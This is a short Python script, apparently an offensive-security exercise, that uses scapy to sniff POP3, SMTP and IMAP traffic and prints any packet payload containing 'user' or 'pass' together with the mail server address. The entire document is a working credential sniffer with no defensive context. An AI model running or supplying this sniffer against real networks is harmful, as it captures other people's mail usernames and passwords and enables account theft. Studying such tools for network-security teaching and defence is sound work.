from scapy.all import *

#callback for all the packages that match the filter
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print"[*] SERVER: %s " % packet[IP].dst
            print"[*] %s " % packet[TCP].payload
    

#trigger the sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)
